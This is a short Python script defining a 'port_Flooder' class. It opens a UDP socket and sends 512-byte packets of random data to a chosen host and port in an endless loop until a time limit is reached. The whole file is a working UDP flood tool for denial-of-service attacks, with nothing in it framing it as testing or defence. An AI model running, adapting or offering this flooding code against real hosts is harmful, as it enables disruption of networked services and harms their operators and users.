import socket
import os
import time
import multiprocessing
import random

class port_Flooder(multiprocessing.process.BaseProcess):
    
    def __init__(self, host, port, time):
        print("Class Init Instantiated")
        #print("Class Instantiated")
        self.tmphost = host #Host (Constant)
        self.tmpport = port #Port (Dynamic)
        self.tmpflood_time = time #Flood Time (Constant)
        self.run()

    def run(self):
        print("Run Init Instantiated")
        #print("Class Instantiated")
        #self.tmphost = host #Host (Constant)
        #self.tmpport = port #Port (Dynamic)
        #self.tmpflood_time = time #Flood Time (Constant)
        self.flood_port(self.tmphost, self.tmpport, self.tmpflood_time)

    def flood_port(self, host, port, time2):
        tmphost = host
        tmpport = port
        tmpflood_time = time2
        print("Received Arguments : Host : "+tmphost+", Port : "+str(tmpport)+", Flood-Time : "+str(tmpflood_time))
        print("Flooding Port "+str(tmpport)+" Using PID "+str(os.getpid()))
        current_count = 0
        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        random_data = bytes(random._urandom(512))
        print("Start Time (Current) : "+str((time.time())))
        stop_time = int(time.time()) + int(tmpflood_time)
        print("Stop Time (Current + -u Input) : "+str(stop_time))
        msg = 0
        while True:
            if ((stop_time) < (time.time())): #or (current_count > 30): #Artificial Break
                break
            else:
                pass
            print("Datagram "+str(msg)+" Sent to "+tmphost+" on Port "+str(tmpport))
            msg = msg + 1
            temp_socket.sendto(random_data, (tmphost, int(tmpport)))
            current_count = current_count + 1




